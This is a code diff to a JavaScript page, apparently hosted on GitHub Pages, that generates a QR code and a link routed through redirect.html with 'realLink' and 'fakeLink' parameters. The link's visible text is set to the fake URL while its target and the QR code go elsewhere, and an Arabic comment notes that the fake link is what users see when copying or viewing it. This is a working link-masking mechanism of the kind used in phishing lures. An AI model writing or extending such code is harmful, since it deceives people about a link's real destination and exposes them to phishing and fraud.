@@ -51,11 +51,11 @@
             var qrElement = document.getElementById("qrcode");
             qrElement.innerHTML = "";
 
-            var repoName = "/trytask2";  // اسم المستودع في GitHub
-            var landingURL = window.location.origin + repoName + "/landing.html?realLink=" + encodeURIComponent(realLink) + "&fakeLink=" + encodeURIComponent(fakeLink);
+            var repoName = "/trytask2";  // اسم المستودع
+            var redirectURL = window.location.origin + repoName + "/redirect.html?realLink=" + encodeURIComponent(realLink) + "&fakeLink=" + encodeURIComponent(fakeLink);
 
-            // ✅ إنشاء QR Code بـ landing.html فقط
-            QRCode.toDataURL(landingURL, { errorCorrectionLevel: 'H' }, function (error, url) {
+            // ✅ توليد الـ QR Code بـ redirect.html (وليس landing.html)
+            QRCode.toDataURL(redirectURL, { errorCorrectionLevel: 'H' }, function (error, url) {
                 if (error) {
                     console.error("Error generating QR Code:", error);
                     return;
@@ -68,12 +68,12 @@
                 qrElement.appendChild(img);
 
                 img.addEventListener("click", function() {
-                    window.location.href = landingURL;
+                    window.location.href = redirectURL;
                 });
 
                 var qrLink = document.getElementById("qrLink");
-                qrLink.href = landingURL;
-                qrLink.innerHTML = fakeLink;  // ✅ إظهار الرابط الوهمي عند النسخ
+                qrLink.href = redirectURL;
+                qrLink.innerHTML = fakeLink;  // ✅ إظهار الرابط الوهمي عند النسخ أو العرض
                 qrLink.style.display = "inline-block";
             });
         });
